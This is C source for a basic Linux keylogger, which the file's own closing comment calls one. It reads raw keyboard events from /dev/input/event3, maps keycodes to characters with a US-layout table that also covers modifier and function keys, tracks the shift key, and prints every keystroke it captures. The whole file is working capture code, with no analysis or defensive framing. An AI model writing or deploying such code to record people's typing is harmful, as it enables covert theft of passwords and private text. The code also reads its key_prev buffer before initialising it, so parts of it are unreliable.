#include <linux/input-event-codes.h>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
// Minimal US-layout keycode -> char map (unshifted)

// grep -c '^#define KEY_' /usr/include/linux/input-event-codes.h
const char *keymap[527] = {

    [KEY_A]="a",
    [KEY_B]="b",
    [KEY_C]="c",
    [KEY_D]="d",
    [KEY_E]="e",
    [KEY_F]="f",
    [KEY_G]="g",
    [KEY_H]="h",
    [KEY_I]="i",
    [KEY_J]="j",
    [KEY_K]="k",
    [KEY_L]="l",
    [KEY_M]="m",
    [KEY_N]="n",
    [KEY_O]="o",
    [KEY_P]="p",
    [KEY_Q]="q",
    [KEY_R]="r",
    [KEY_S]="s",
    [KEY_T]="t",
    [KEY_U]="u",
    [KEY_V]="v",
    [KEY_W]="w",
    [KEY_X]="x",
    [KEY_Y]="y",
    [KEY_Z]="z",
    [KEY_1]="1",
    [KEY_2]="2",
    [KEY_3]="3",
    [KEY_4]="4",
    [KEY_5]="5",
    [KEY_6]="6",
    [KEY_7]="7",
    [KEY_8]="8",
    [KEY_9]="9",
    [KEY_0]="0",

    [KEY_SPACE]=" ",
    [KEY_ENTER]="[RETURN]",
    [KEY_BACKSPACE]="[BKSP]",
    [KEY_TAB]="[TAB]",

    [KEY_LEFTSHIFT]="[LSHIFT]",
    [KEY_RIGHTSHIFT]="[RSHIFT]",

    [KEY_RIGHTMETA]="[RSUPER]",
    [KEY_LEFTMETA]="[LSUPER]",

    [KEY_LEFTALT]="[LALT]",
    [KEY_RIGHTALT]="[RALT]",

    [KEY_LEFTCTRL]="[LCTRL]",
    [KEY_RIGHTCTRL]="[RCTRL]",

    [KEY_RIGHTBRACE]="]",
    [KEY_LEFTBRACE]="[",

    [KEY_UP]="[UP]",
    [KEY_DOWN]="[DOWN]",
    [KEY_LEFT]="[LEFT]",
    [KEY_RIGHT]="[RIGHT]",

    [KEY_COMMA]=",",
    [KEY_APOSTROPHE]="\"",
    [KEY_QUESTION]="?",
    [KEY_DOT]=".",
    [KEY_MINUS]="-",
    [KEY_EQUAL]="=", 
    [KEY_BACKSLASH]="\\",
    [41]="`",


    [KEY_F1]="[F1]",
    [KEY_F2]="[F2]",
    [KEY_F3]="[F3]",
    [KEY_F4]="[F4]",
    [KEY_F5]="[F5]",
    [KEY_F6]="[F6]",
    [KEY_F7]="[F7]",
    [KEY_F8]="[F8]",
    [KEY_F9]="[F9]",
    [KEY_F10]="[F10]",
    [KEY_F11]="[F11]",
    [KEY_F12]="[F12]",
};

int main() {
    int fd = open("/dev/input/event3", O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }

    struct input_event ev;
    char key_prev[64];
    while (read(fd, &ev, sizeof(ev)) == sizeof(ev)) {
        if (ev.type == EV_KEY && ev.value == 1) { // 1 = key down only
            if (ev.code < 128 && keymap[ev.code]) {
                if(strcmp(keymap[ev.code], "[LSHIFT]") == 0 || strcmp(keymap[ev.code], "[RSHIFT]") == 0) {
                    strcpy(key_prev, keymap[ev.code]);
                    continue;
                }
                if(strcmp(key_prev, "[LSHIFT]") == 0 || strcmp(key_prev, "[RSHIFT]") == 0) {
                    printf("shift+%s",keymap[ev.code]);
                    memset(key_prev, 0, sizeof(key_prev));
                } else {
                    printf("%s", keymap[ev.code]);
                }
            } else {
                printf("[code:%d]", ev.code);
            }
            fflush(stdout);
        }
    }
    close(fd);
    return 0;
}

// See Also : input-event-codes.c : the most basic implementation of the keylogger, raw codes. 
// But, you might have to tune the keyboard path.
